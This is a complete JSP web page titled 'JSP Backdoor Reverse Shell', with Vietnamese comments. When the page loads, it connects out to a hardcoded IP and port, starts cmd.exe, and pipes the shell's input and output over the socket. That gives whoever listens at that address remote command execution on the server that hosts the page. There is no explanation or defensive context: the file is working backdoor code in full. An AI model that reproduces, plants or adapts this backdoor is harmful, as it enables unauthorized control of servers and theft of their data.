<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
%>
<%!
static class StreamConnector extends Thread
{
    InputStream is;
    OutputStream os;

    StreamConnector(InputStream is, OutputStream os)
    {
        this.is = is;
        this.os = os;
    }

    public void run()
    {
        BufferedReader isr = null;
        BufferedWriter osw = null;

        try
        {
            isr = new BufferedReader(new InputStreamReader(is));
            osw = new BufferedWriter(new OutputStreamWriter(os));

            char buffer[] = new char[8192];
            int lenRead;

            while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
            {
                osw.write(buffer, 0, lenRead);
                osw.flush();
            }
        }
        catch (Exception ioe)
        {
            ioe.printStackTrace(); // In lỗi ra console (optional)
        }
        finally
        {
            try
            {
                if(isr != null) isr.close();
                if(osw != null) osw.close();
            }
            catch (Exception ioe)
            {
                ioe.printStackTrace(); // In lỗi ra console (optional)
            }
        }
    }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<%
String ipAddress = "192.168.222.131";
String ipPort = "433";

if(ipAddress != null && ipPort != null)
{
    Socket sock = null;
    try
    {
        sock = new Socket(ipAddress, Integer.parseInt(ipPort));

        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec("cmd.exe");

        StreamConnector outputConnector =
                new StreamConnector(proc.getInputStream(),
                                    sock.getOutputStream());

        StreamConnector inputConnector =
                new StreamConnector(sock.getInputStream(),
                                    proc.getOutputStream());

        outputConnector.start();
        inputConnector.start();
    }
    catch(Exception e)
    {
        e.printStackTrace(); // In lỗi ra console (optional)
    }
}
%>
